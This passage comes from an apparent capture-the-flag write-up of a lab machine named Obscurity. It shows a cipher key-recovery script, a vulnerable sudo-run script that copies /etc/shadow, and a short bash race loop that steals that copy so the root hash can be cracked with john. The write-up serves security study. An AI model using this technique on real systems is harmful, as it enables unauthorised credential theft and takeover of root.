        <span class="k">for</span> <span class="n">incr</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">255</span><span class="p">):</span>    <span class="c1"># provo ogni valore di chiave
</span>            <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">cryptChr</span><span class="p">)</span>
            <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">-</span> <span class="n">incr</span><span class="p">)</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">newChr</span> <span class="o">==</span> <span class="n">clearFile</span><span class="p">[</span><span class="n">indCrypt</span><span class="p">]:</span>
                <span class="n">key</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">incr</span><span class="p">)</span>
                <span class="k">break</span>                <span class="c1"># vado alla lettera criptata successiva
</span>        <span class="n">indCrypt</span> <span class="o">=</span> <span class="n">indCrypt</span> <span class="o">+</span><span class="mi">1</span>        <span class="c1"># tengo il conto della posizione del carattere
</span>
    <span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</code></pre></div></div>

<p>Running our script, we will get the <strong>secret password</strong>, and through the password we will be able to decode <strong>passwordreminder.txt</strong></p>

<p><img src="/assets/images/Screenshots/Obscurity//2020-02-27_18-46-47.png" alt="2020-02-27_18-46-47" /></p>

<p><img src="/assets/images/Screenshots/Obscurity//2020-02-27_18-55-35.png" alt="2020-02-27_18-55-35" /></p>

<p><strong>Password found!</strong> Now we can use it via the command <strong>su</strong> to become <strong>Robert</strong>.</p>

<p><br /></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>

<p>Like the rest of the machine, the privilege escalation path is also based on the exploitation of a custom component of the box.
By running the <code class="language-plaintext highlighter-rouge">sudo -l</code> command we will notice how the user can run the <strong>BetterSSH.py</strong> script with root permissions.</p>

<p><strong>BetterSSH.py</strong> source is the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">random</span><span class="p">,</span> <span class="n">string</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">crypt</span>
<span class="kn">import</span> <span class="nn">traceback</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="n">path</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span>
<span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s">"user"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span> <span class="s">"authenticated"</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter username: "</span><span class="p">)</span>
    <span class="n">passW</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter password: "</span><span class="p">)</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/etc/shadow'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">[(</span><span class="n">p</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span> <span class="k">if</span> <span class="s">"$"</span> <span class="ow">in</span> <span class="n">p</span> <span class="k">else</span> <span class="bp">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">passwords</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

    <span class="n">passwordFile</span> <span class="o">=</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">])</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">passwordFile</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(.</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">salt</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">realPass</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]:</span>
            <span class="n">salt</span><span class="p">,</span> <span class="n">realPass</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'$'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
            <span class="k">break</span>

    <span class="k">if</span> <span class="n">salt</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid user"</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">salt</span> <span class="o">=</span> <span class="s">'$6$'</span><span class="o">+</span><span class="n">salt</span><span class="o">+</span><span class="s">'$'</span>
    <span class="n">realPass</span> <span class="o">=</span> <span class="n">salt</span> <span class="o">+</span> <span class="n">realPass</span>

    <span class="nb">hash</span> <span class="o">=</span> <span class="n">crypt</span><span class="p">.</span><span class="n">crypt</span><span class="p">(</span><span class="n">passW</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>

    <span class="k">if</span> <span class="nb">hash</span> <span class="o">==</span> <span class="n">realPass</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Authed!"</span><span class="p">)</span>
        <span class="n">session</span><span class="p">[</span><span class="s">'authenticated'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Incorrect pass"</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="p">,</span><span class="n">path</span><span class="p">))</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="n">traceback</span><span class="p">.</span><span class="n">print_exc</span><span class="p">()</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s">'authenticated'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">+</span> <span class="s">"@Obscure$ "</span><span class="p">)</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s">'sudo'</span><span class="p">,</span> <span class="s">'-u'</span><span class="p">,</span>  <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]]</span>
        <span class="n">cmd</span><span class="p">.</span><span class="n">extend</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">))</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>

        <span class="n">o</span><span class="p">,</span><span class="n">e</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'Output: '</span> <span class="o">+</span> <span class="n">o</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'Error: '</span>  <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
</code></pre></div></div>

<p>Here we can follow two methods to get root permissions:</p>

<ol>
  <li>Intercept the file with <code class="language-plaintext highlighter-rouge">/etc/shadow</code> contents</li>
  <li>Exploit the code vulnerability</li>
</ol>

<p>To save time, I decided to follow the first path.</p>

<p>Since <em>the script temporarily saves</em> the contents of <code class="language-plaintext highlighter-rouge">/etc/shadow</code> <em>within a randomly named file</em> in <code class="language-plaintext highlighter-rouge">/tmp/SSH</code>, it is possible to intercept it and move it before the script removes it.</p>

<p>To do this, we have to create the following mini-script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">while</span> :
<span class="k">do
    </span>find <span class="s2">"/tmp/SSH"</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">mv</span> <span class="o">{}</span> /tmp/tmp <span class="se">\;</span>
<span class="k">done</span>
</code></pre></div></div>

<p>and run it, simultaneously execute <strong>BetterSSH.py</strong> with <strong>sudo</strong>.</p>

<p><img src="/assets/images/Screenshots/Obscurity//2020-02-27_21-20-57.png" alt="2020-02-27_21-20-57" /></p>

<p>The program will return an error because it will not be able to delete the file that we have intercepted.</p>

<p>On the other hand, by opening the intercepted file, we will be able to <strong>extract the hash of the root user</strong> to crack it with <strong>john</strong>.
Once the password is obtained, we can use the <strong>su</strong> command to authenticate as <strong>root</strong>.</p>

<p><img src="/assets/images/Screenshots/Obscurity//2020-02-27_21-34-11.png" alt="2020-02-27_21-34-11" /></p>

<h2 id="trophy">Trophy</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Notoriety wasn't as good as fame, but was heaps better than obscurity.
- Neil Gaiman
</code></pre></div></div>

<style>
.share {
  display: block;
  margin-left: auto;
  margin-right: auto;
  text-align: center;
}
</style>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs>
    <symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z" /></symbol>
    <symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z" /></symbol>
    <symbol id="icon-email" viewBox="0 0 1024 1024"><path class="path1" d="M950.857 859.429v-438.857q-18.286 20.571-39.429 37.714-153.143 117.714-243.429 193.143-29.143 24.571-47.429 38.286t-49.429 27.714-58.571 14h-1.143q-27.429 0-58.571-14t-49.429-27.714-47.429-38.286q-90.286-75.429-243.429-193.143-21.143-17.143-39.429-37.714v438.857q0 7.429 5.429 12.857t12.857 5.429h841.143q7.429 0 12.857-5.429t5.429-12.857zM950.857 258.857v-14t-0.286-7.429-1.714-7.143-3.143-5.143-5.143-4.286-8-1.429h-841.143q-7.429 0-12.857 5.429t-5.429 12.857q0 96 84 162.286 110.286 86.857 229.143 181.143 3.429 2.857 20 16.857t26.286 21.429 25.429 18 28.857 15.714 24.571 5.143h1.143q11.429 0 24.571-5.143t28.857-15.714 25.429-18 26.286-21.429 20-16.857q118.857-94.286 229.143-181.143 30.857-24.571 57.429-66t26.571-75.143zM1024 237.714v621.714q0 37.714-26.857 64.571t-64.571 26.857h-841.143q-37.714 0-64.571-26.857t-26.857-64.571v-621.714q0-37.714 26.857-64.571t64.571-26.857h841.143q37.714 0 64.571 26.857t26.857 64.571z" /></symbol>
    <symbol id="icon-close" viewBox="0 0 805 1024"><path class="path1" d="M741.714 755.429q0 22.857-16 38.857l-77.714 77.714q-16 16-38.857 16t-38.857-16l-168-168-168 168q-16 16-38.857 16t-38.857-16l-77.714-77.714q-16-16-16-38.857t16-38.857l168-168-168-168q-16-16-16-38.857t16-38.857l77.714-77.714q16-16 38.857-16t38.857 16l168 168 168-168q16-16 38.857-16t38.857 16l77.714 77.714q16 16 16 38.857t-16 38.857l-168 168 168 168q16 16 16 38.857z" /></symbol>
    <symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z" /></symbol>
    <symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z" /></symbol>
    <symbol id="icon-rss" viewBox="0 0 805 1024"><path class="path1" d="M219.429 768q0 45.714-32 77.714t-77.714 32-77.714-32-32-77.714 32-77.714 77.714-32 77.714 32 32 77.714zM512 838.286q1.143 16-9.714 27.429-10.286 12-26.857 12h-77.143q-14.286 0-24.571-9.429t-11.429-23.714q-12.571-130.857-105.429-223.714t-223.714-105.429q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.571 12-26.857 9.714-9.714 24.571-9.714h2.857q91.429 7.429 174.857 46t148 103.714q65.143 64.571 103.714 148t46 174.857zM804.571 839.429q1.143 15.429-10.286 26.857-10.286 11.429-26.286 11.429h-81.714q-14.857 0-25.429-10t-11.143-24.286q-6.857-122.857-57.714-233.429t-132.286-192-192-132.286-233.429-58.286q-14.286-0.571-24.286-11.143t-10-24.857v-81.714q0-16 11.429-26.286 10.286-10.286 25.143-10.286h1.714q149.714 7.429 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.571 286.571z" /></symbol>
    <symbol id="icon-google-plus" viewBox="0 0 951 1024"><path class="path1" d="M420 454.857q0 20.571 18.286 40.286t44.286 38.857 51.714 42 44 59.429 18.286 81.143q0 51.429-27.429 98.857-41.143 69.714-120.571 102.571t-170.286 32.857q-75.429 0-140.857-23.714t-98-78.571q-21.143-34.286-21.143-74.857 0-46.286 25.429-85.714t67.714-65.714q74.857-46.857 230.857-57.143-18.286-24-27.143-42.286t-8.857-41.714q0-20.571 12-48.571-26.286 2.286-38.857 2.286-84.571 0-142.571-55.143t-58-139.714q0-46.857 20.571-90.857t56.571-74.857q44-37.714 104.286-56t124.286-18.286h238.857l-78.857 50.286h-74.857q42.286 36 64 76t21.714 91.429q0 41.143-14 74t-33.714 53.143-39.714 37.143-34 35.143-14 37.714zM336.571 400q21.714 0 44.571-9.429t37.714-24.857q30.286-32.571 30.286-90.857 0-33.143-9.714-71.429t-27.714-74-48.286-59.143-66.857-23.429q-24 0-47.143 11.143t-37.429 30q-26.857 33.714-26.857 91.429 0 26.286 5.714 55.714t18 58.857 29.714 52.857 42.857 38.286 55.143 14.857zM337.714 898.857q33.143 0 63.714-7.429t56.571-22.286 41.714-41.714 15.714-62.286q0-14.286-4-28t-8.286-24-15.429-23.714-16.857-20-22-19.714-20.857-16.571-23.714-17.143-20.857-14.857q-9.143-1.143-27.429-1.143-30.286 0-60 4t-61.429 14.286-55.429 26.286-39.143 42.571-15.429 60.286q0 40 20 70.571t52.286 47.429 68 25.143 72.857 8.286zM800.571 398.286h121.714v61.714h-121.714v125.143h-60v-125.143h-121.143v-61.714h121.143v-124h60v124z" /></symbol>
    <symbol id="icon-github-alt" viewBox="0 0 951 1024"><path class="path1" d="M365.714 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM731.429 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM822.857 694.857q0-68.571-39.429-116.571t-106.857-48q-23.429 0-111.429 12-40.571 6.286-89.714 6.286t-89.714-6.286q-86.857-12-111.429-12-67.429 0-106.857 48t-39.429 116.571q0 50.286 18.286 87.714t46.286 58.857 69.714 34.286 80 16.857 85.143 4h96q46.857 0 85.143-4t80-16.857 69.714-34.286 46.286-58.857 18.286-87.714zM950.857 594.286q0 118.286-34.857 189.143-21.714 44-60.286 76t-80.571 49.143-97.143 27.143-98 12.571-95.429 2.571q-44.571 0-81.143-1.714t-84.286-7.143-87.143-17.143-78.286-29.429-69.143-46.286-49.143-65.714q-35.429-70.286-35.429-189.143 0-135.429 77.714-226.286-15.429-46.857-15.429-97.143 0-66.286 29.143-124.571 61.714 0 108.571 22.571t108 70.571q84-20 176.571-20 84.571 0 160 18.286 60-46.857 106.857-69.143t108-22.286q29.143 58.286 29.143 124.571 0 49.714-15.429 96 77.714 91.429 77.714 227.429z" /></symbol>
    <symbol id="icon-right-arrow"><path d="M21.205,5.007c-0.429-0.444-1.143-0.444-1.587,0c-0.429,0.429-0.429,1.143,0,1.571l8.047,8.047H1.111  C0.492,14.626,0,15.118,0,15.737c0,0.619,0.492,1.127,1.111,1.127h26.554l-8.047,8.032c-0.429,0.444-0.429,1.159,0,1.587  c0.444,0.444,1.159,0.444,1.587,0l9.952-9.952c0.444-0.429,0.444-1.143,0-1.571L21.205,5.007z" fill="#efb102" /></symbol>
    <symbol id="icon-linkedin" viewBox="0 0 12 14"><path class="path1" d="M1.852 11.047h1.805v-5.422h-1.805v5.422zM3.773 3.953q-0.008-0.406-0.281-0.672t-0.727-0.266-0.738 0.266-0.285 0.672q0 0.398 0.277 0.668t0.723 0.27h0.008q0.461 0 0.742-0.27t0.281-0.668zM8.344 11.047h1.805v-3.109q0-1.203-0.57-1.82t-1.508-0.617q-1.062 0-1.633 0.914h0.016v-0.789h-1.805q0.023 0.516 0 5.422h1.805v-3.031q0-0.297 0.055-0.438 0.117-0.273 0.352-0.465t0.578-0.191q0.906 0 0.906 1.227v2.898zM12 3.25v7.5q0 0.93-0.66 1.59t-1.59 0.66h-7.5q-0.93 0-1.59-0.66t-0.66-1.59v-7.5q0-0.93 0.66-1.59t1.59-0.66h7.5q0.93 0 1.59 0.66t0.66 1.59z"></path></symbol>
    <symbol id="icon-instagram" viewBox="0 0 438.536 438.536"><path class="path1" d="M421.981,16.562C410.941,5.519,397.711,0,382.298,0H56.248C40.83,0,27.604,5.521,16.561,16.562
		C5.52,27.6,0.001,40.828,0.001,56.243V382.29c0,15.413,5.518,28.644,16.56,39.683c11.043,11.04,24.272,16.563,39.687,16.563
		h326.046c15.41,0,28.644-5.523,39.684-16.563c11.043-11.039,16.557-24.27,16.557-39.683V56.243
		C438.534,40.825,433.021,27.604,421.981,16.562z M157.462,158.025c17.224-16.652,37.924-24.982,62.097-24.982
		c24.36,0,45.153,8.33,62.381,24.982c17.228,16.655,25.837,36.785,25.837,60.386c0,23.598-8.609,43.729-25.837,60.379
		c-17.228,16.659-38.014,24.988-62.381,24.988c-24.172,0-44.87-8.336-62.097-24.988c-17.228-16.652-25.841-36.781-25.841-60.379
		C131.621,194.81,140.234,174.681,157.462,158.025z M388.865,370.589c0,4.945-1.718,9.083-5.141,12.416
		c-3.433,3.33-7.519,4.996-12.282,4.996h-305.2c-4.948,0-9.091-1.666-12.419-4.996c-3.333-3.326-4.998-7.471-4.998-12.416V185.575
		H89.08c-3.805,11.993-5.708,24.462-5.708,37.402c0,36.553,13.322,67.715,39.969,93.511c26.65,25.786,58.721,38.685,96.217,38.685
		c24.744,0,47.583-5.903,68.527-17.703c20.937-11.807,37.486-27.839,49.676-48.112c12.183-20.272,18.274-42.4,18.274-66.38
		c0-12.94-1.91-25.406-5.715-37.402h38.547v185.014H388.865z M388.865,115.626c0,5.52-1.903,10.184-5.716,13.99
		c-3.805,3.809-8.466,5.711-13.989,5.711h-49.676c-5.517,0-10.185-1.903-13.99-5.711c-3.806-3.806-5.708-8.47-5.708-13.99V68.522
		c0-5.33,1.902-9.945,5.708-13.848c3.806-3.901,8.474-5.854,13.99-5.854h49.676c5.523,0,10.185,1.952,13.989,5.854
		c3.812,3.903,5.716,8.518,5.716,13.848V115.626z" /></symbol>
    <symbol id="icon-telegram" viewBox="0 0 80 80">
    <path d="M 70.511719 10.986328 C 69.833089 11.015588 69.157051 11.196735 68.537109 11.4375 L 68.535156 11.4375 C 67.931048 11.673297 64.049934 13.281226 58.392578 15.628906 C 52.735222 17.976586 45.3821 21.032905 38.091797 24.064453 C 23.51119 30.12755 9.1835937 36.091797 9.1835938 36.091797 L 9.2480469 36.068359 C 9.2480469 36.068359 8.4485192 36.330303 7.6484375 36.871094 C 7.2483967 37.141489 6.8283994 37.486951 6.4960938 37.966797 C 6.163788 38.446643 5.9299055 39.103809 6.0195312 39.808594 C 6.1812736 41.080477 7.0482024 41.912426 7.7636719 42.412109 C 8.4791414 42.911793 9.1660156 43.148437 9.1660156 43.148438 L 9.1738281 43.152344 L 23.1875 47.785156 C 23.418097 48.587707 27.163839 61.631062 28.046875 64.384766 C 28.50876 65.826709 28.935922 66.627156 29.335938 67.130859 C 29.535944 67.382711 29.733459 67.561543 29.931641 67.683594 C 30.016841 67.736064 30.101273 67.771554 30.183594 67.802734 C 30.197014 67.807834 30.211349 67.817736 30.224609 67.822266 C 30.252855 67.83191 30.267938 67.831811 30.302734 67.839844 C 31.62302 68.328201 32.738281 67.476563 32.738281 67.476562 L 32.769531 67.453125 L 42.376953 59 L 56.585938 70.394531 L 56.710938 70.449219 C 58.991132 71.431474 60.875783 70.891854 61.970703 70.027344 C 63.065623 69.162833 63.509766 68.03125 63.509766 68.03125 L 63.544922 67.943359 L 73.794922 16.097656 C 74.046117 14.98858 74.071392 14.057617 73.853516 13.257812 C 73.635643 12.458006 73.128863 11.807693 72.5 11.443359 C 71.871137 11.079025 71.190348 10.957066 70.511719 10.986328 z M 70.566406 13.021484 C 70.96444 13.004357 71.29991 13.059037 71.498047 13.173828 C 71.696183 13.288619 71.824951 13.420226 71.923828 13.783203 C 72.022708 14.14618 72.046557 14.758873 71.84375 15.654297 L 71.839844 15.667969 L 61.630859 67.3125 C 61.615849 67.34707 61.352842 67.965627 60.730469 68.457031 C 60.102941 68.952505 59.248838 69.318622 57.578125 68.626953 L 34.738281 50.310547 A 1.0001 1.0001 0 0 0 34 50 A 1.0001 1.0001 0 0 0 32.988281 50.974609 L 30.384766 64.923828 C 30.251656 64.61729 30.108215 64.257609 29.953125 63.773438 C 29.147161 61.260079 25.522903 48.675314 25.166016 47.435547 L 61.013672 24.226562 A 1.0001 1.0001 0 0 0 62 25 A 1.0001 1.0001 0 0 0 62.988281 23.783203 C 63.014848 23.477186 62.989225 23.17624 62.855469 22.876953 C 62.639651 22.394056 62.128723 22.100054 61.765625 22.03125 C 61.039429 21.893642 60.566406 22.158203 60.566406 22.158203 L 60.466797 22.195312 L 23.857422 45.900391 L 9.8261719 41.261719 L 9.8222656 41.259766 C 9.8185507 41.25848 9.3777555 41.099419 8.9082031 40.771484 C 8.4366726 40.442168 8.062164 40.014757 8.0039062 39.556641 C 7.9835322 39.396426 8.0143062 39.287873 8.140625 39.105469 C 8.2669443 38.923065 8.501119 38.707449 8.7675781 38.527344 C 9.3004964 38.167134 9.8886719 37.962891 9.8886719 37.962891 L 9.9199219 37.951172 L 9.953125 37.9375 C 9.953125 37.9375 24.279232 31.97306 38.859375 25.910156 C 46.149446 22.878704 53.503668 19.823883 59.160156 17.476562 C 64.816644 15.129243 68.856374 13.458984 69.261719 13.300781 C 69.707777 13.127547 70.168373 13.038612 70.566406 13.021484 z M 59.199219 25.699219 L 58.398438 26.101562 L 58.240234 26.984375 L 58.853516 27.638672 L 59.199219 27.699219 L 60 27.298828 L 60.158203 26.416016 L 59.546875 25.761719 L 59.199219 25.699219 z M 56.400391 28.400391 L 55.599609 28.800781 L 55.441406 29.683594 L 56.052734 30.337891 L 56.400391 30.400391 L 57.201172 29.998047 L 57.359375 29.117188 L 56.746094 28.462891 L 56.400391 28.400391 z M 53.599609 31.099609 L 52.798828 31.501953 L 52.640625 32.382812 L 53.251953 33.037109 L 53.599609 33.099609 L 54.400391 32.699219 L 54.558594 31.816406 L 53.947266 31.162109 L 53.599609 31.099609 z M 50.800781 33.800781 L 49.998047 34.201172 L 49.841797 35.083984 L 50.453125 35.738281 L 50.800781 35.800781 L 51.601562 35.398438 L 51.759766 34.517578 L 51.146484 33.861328 L 50.800781 33.800781 z M 48 36.5 L 47.199219 36.902344 L 47.041016 37.783203 L 47.652344 38.4375 L 48 38.5 L 48.800781 38.099609 L 48.958984 37.216797 L 48.347656 36.5625 L 48 36.5 z M 45.199219 39.199219 L 44.398438 39.601562 L 44.240234 40.484375 L 44.853516 41.138672 L 45.199219 41.199219 L 46.001953 40.798828 L 46.158203 39.916016 L 45.546875 39.261719 L 45.199219 39.199219 z M 42.400391 41.900391 L 41.599609 42.300781 L 41.441406 43.183594 L 42.052734 43.837891 L 42.400391 43.900391 L 43.201172 43.498047 L 43.359375 42.617188 L 42.746094 41.962891 L 42.400391 41.900391 z M 39.599609 44.599609 L 38.798828 45.001953 L 38.640625 45.882812 L 39.253906 46.537109 L 39.599609 46.599609 L 40.400391 46.199219 L 40.558594 45.316406 L 39.947266 44.662109 L 39.599609 44.599609 z M 36.800781 47.300781 L 35.998047 47.701172 L 35.841797 48.583984 L 36.453125 49.238281 L 36.800781 49.300781 L 37.601562 48.898438 L 37.759766 48.015625 L 37.146484 47.361328 L 36.800781 47.300781 z M 34.675781 52.824219 L 40.794922 57.730469 L 32.378906 65.132812 L 34.675781 52.824219 z" />
     </symbol>
     <symbol id="icon-youtube" viewBox="0 0 24 24">
